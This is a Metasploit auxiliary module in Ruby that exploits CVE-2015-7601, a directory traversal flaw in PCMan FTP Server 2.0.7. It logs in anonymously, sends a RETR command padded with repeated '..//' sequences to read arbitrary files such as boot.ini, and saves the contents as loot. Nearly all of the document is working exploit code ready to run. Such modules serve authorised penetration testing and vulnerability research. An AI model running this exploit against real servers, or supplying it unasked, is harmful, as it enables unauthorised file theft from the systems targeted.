##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Ftp
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'PCMan FTP Server 2.0.7 Directory Traversal Information Disclosure',
      'Description'    => %q{
        This module exploits a directory traversal vulnerability found in PCMan FTP Server 2.0.7.
        This vulnerability allows an attacker to download arbitrary files from the server by crafting
        a RETR command that includes file system traversal strings such as '..//'
      },
      'Platform'       => 'win',
      'Author'         =>
        [
          'Jay Turla',   # @shipcod3, msf and initial discovery
          'James Fitts', # initial discovery
          'Brad Wolfe <brad.wolfe[at]gmail.com>'
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'EDB', '38340'],
          [ 'CVE', '2015-7601']
        ],
      'DisclosureDate' => 'Sep 28 2015'
    ))

    register_options(
      [
        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 32 ]),
        OptString.new('PATH', [ true, "Path to the file to disclose, releative to the root dir.", 'boot.ini'])
      ], self.class)
  end

  def check_host(ip)
    begin
      connect
      if /220 PCMan's FTP Server 2\.0/i === banner
        return Exploit::CheckCode::Appears
      end
    ensure
      disconnect
    end

    Exploit::CheckCode::Safe
  end

  def run_host(target_host)
    begin
      # Login anonymously and open the socket that we'll use for data retrieval.
      connect_login
      sock = data_connect
      file_path = datastore['PATH']
      file = ::File.basename(file_path)

      # make RETR request and store server response message...
      retr_cmd = ( "..//" * datastore['DEPTH'] ) + "#{file_path}"
      res = send_cmd( ["RETR", retr_cmd])

      # read the file data from the socket that we opened
      response_data = sock.read(1024)

      if response_data.length == 0 or ! (res =~ /^150/ )
        print_status("File (#{file_path})from #{peer} is empty...")
        return
      end

      # store file data to loot
      loot_file = store_loot("pcman.ftp.data", "text", rhost, response_data, file, file_path)
      vprint_status("Data returned:\n")
      vprint_line(response_data)
      print_good("Stored #{file_path} to #{loot_file}")

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e
      vprint_error(e.message)
      elog("#{e.class} #{e.message} #{e.backtrace * "\n"}")
    rescue ::Timeout::Error, ::Errno::EPIPE => e
      vprint_error(e.message)
      elog("#{e.class} #{e.message} #{e.backtrace * "\n"}")
    ensure
      data_disconnect
      disconnect
    end
  end
end
